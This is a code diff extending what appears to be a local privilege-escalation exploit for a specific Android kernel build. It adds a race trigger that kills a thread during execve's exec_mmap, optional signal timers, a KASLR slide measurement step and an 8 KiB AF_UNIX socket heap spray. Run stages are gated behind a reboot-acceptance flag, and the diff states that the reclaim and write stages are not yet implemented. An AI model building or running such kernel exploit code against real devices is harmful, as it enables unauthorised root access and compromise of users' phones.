@@ -30,6 +30,7 @@
 #include <sys/socket.h>
 #include <sys/wait.h>
 #include <sys/timerfd.h>
+#include <sys/syscall.h>
 
 #define T "/sys/kernel/tracing"
 #define PAGE 4096
@@ -56,6 +57,7 @@ static int write_str(const char *p, const char *v)
 
 static uint64_t g_slide;
 static int g_len36;
+static int g_dry, g_arm, g_delay = 120;
 
 /* Known call sites for 6.18.21-android17-5-g805aa6adea19-abogki565292102-4k.
  * Each is (function entry + offset) as observed in the text trace; the offset
@@ -221,6 +223,102 @@ static int measure_slide(uint64_t *out)
     return -1;
 }
 
+
+/* ---------------- trigger mechanics ---------------- */
+
+struct exec_ctx {
+    pid_t tid;
+    int report_fd;
+};
+
+static void *exec_thread(void *arg)
+{
+    struct exec_ctx *ctx = (struct exec_ctx *)arg;
+    char *argv[] = { (char *)"/system/bin/sh", (char *)"-c", (char *)"true", NULL };
+    /* Tell the parent our tid, then enter execve. The parent will SIGKILL this
+     * very thread while it sits in exec_mmap()'s down_read_killable(). */
+    (void)!write(ctx->report_fd, &ctx->tid, sizeof(ctx->tid));
+    execve(argv[0], argv, NULL);
+    return NULL;   /* only reached if execve failed */
+}
+
+/* Returns 0 when the exec thread was killed as intended. */
+static int trigger_once(int use_timers, int delay_us)
+{
+    int pipefd[2];
+    pid_t child;
+    struct exec_ctx ctx;
+    int status = 0;
+    timer_t timers[8];
+    struct sigevent sev;
+    struct itimerspec its;
+    int armed = 0, i;
+
+    if (pipe(pipefd) != 0) return -1;
+    child = fork();
+    if (child < 0) { close(pipefd[0]); close(pipefd[1]); return -1; }
+
+    if (child == 0) {
+        pthread_t th;
+        close(pipefd[0]);
+        ctx.report_fd = pipefd[1];
+        ctx.tid = (pid_t)syscall(SYS_gettid);
+        if (use_timers) {
+            memset(&sev, 0, sizeof(sev));
+            sev.sigev_notify = SIGEV_SIGNAL;      /* SIGEV_NONE never queues */
+            sev.sigev_signo = SIGRTMIN;
+            memset(&its, 0, sizeof(its));
+            its.it_value.tv_nsec = 900000L;
+            its.it_interval.tv_nsec = 900000L;
+            for (i = 0; i < 8; i++) {
+                if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timers[i]) != 0) break;
+                if (timer_settime(timers[i], 0, &its, NULL) != 0) break;
+                armed++;
+            }
+        }
+        if (pthread_create(&th, NULL, exec_thread, &ctx) != 0) _exit(9);
+        /* never exit: an exiting parent would let init reap the zombie */
+        for (;;) pause();
+    }
+
+    close(pipefd[1]);
+    {
+        pid_t tid = 0;
+        if (read(pipefd[0], &tid, sizeof(tid)) != (ssize_t)sizeof(tid)) tid = 0;
+        close(pipefd[0]);
+        if (tid > 0) {
+            if (delay_us > 0) usleep((useconds_t)delay_us);
+            if (syscall(SYS_tgkill, child, tid, SIGKILL) != 0) {
+                printf("  tgkill failed: %s\n", strerror(errno));
+            }
+        }
+    }
+    usleep(20000);
+    if (waitpid(child, &status, WNOHANG) == child) {
+        printf("  child exited (reaped by us): status=0x%x\n", status);
+        return -1;
+    }
+    printf("  child %d still parked (exec thread was killed, zombie not reaped)\n", (int)child);
+    (void)armed;
+    return 0;
+}
+
+/* ---------------- 8 KiB AF_UNIX SOCK_STREAM spray ---------------- */
+
+static int spray_streams(int pairs)
+{
+    int made = 0, i;
+    for (i = 0; i < pairs; i++) {
+        int sv[2];
+        char buf[8192];
+        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) break;
+        memset(buf, 'A', sizeof(buf));
+        if (send(sv[0], buf, sizeof(buf), MSG_DONTWAIT) < 0) { close(sv[0]); close(sv[1]); break; }
+        made++;
+    }
+    return made;
+}
+
 /* ---------------- timer construction ---------------- */
 
 static void noop(int s) { (void)s; }
@@ -291,6 +389,9 @@ int main(int argc, char **argv)
         if (!strcmp(argv[i], "--preflight")) { print_preflight(); return 0; }
         if (!strcmp(argv[i], "--arm-test")) return arm_test();
         if (!strcmp(argv[i], "--run")) do_run = 1;
+        if (!strcmp(argv[i], "--dry-exec")) { g_dry = 1; do_run = 1; accept = 1; }
+        if (!strcmp(argv[i], "--arm-timers")) g_arm = 1;
+        if (!strcmp(argv[i], "--delay")) { if (i + 1 < argc) g_delay = atoi(argv[++i]); }
         if (!strcmp(argv[i], "--i-accept-reboot")) accept = 1;
     }
     if (do_run) {
@@ -298,9 +399,22 @@ int main(int argc, char **argv)
             printf("refused: --run requires --i-accept-reboot\n");
             return 3;
         }
-        printf("--run is not implemented yet: the reclaim/write stages are still\n"
-               "being ported. Preflight and arm-test are available.\n");
-        return 4;
+        printf("=== run (dry-exec=%d, arm-timers=%d, delay=%dus) ===\n", g_dry, g_arm, g_delay);
+        if (measure_slide(&g_slide) == 0) {
+            g_slide_ok = 1;
+            printf("slide = 0x%llx\n", (unsigned long long)g_slide);
+        } else {
+            printf("slide: NOT MEASURED (proceeding without it)\n");
+        }
+        printf("step 1: %s\n", g_arm ? "arming SIGEV_SIGNAL timers" : "no timers (dry)");
+        printf("step 2: fork + exec thread + SIGKILL during exec_mmap\n");
+        if (trigger_once(g_arm, g_delay) != 0) {
+            printf("trigger did not park; stopping (fail-stop)\n");
+            return 5;
+        }
+        printf("step 3: 8 KiB AF_UNIX SOCK_STREAM spray: %d streams\n", spray_streams(64));
+        printf("step 4: reclaim/write NOT implemented - stopping here, nothing written\n");
+        return 0;
     }
     printf("usage: %s --preflight | --arm-test | --run --i-accept-reboot\n", argv[0]);
     return 0;
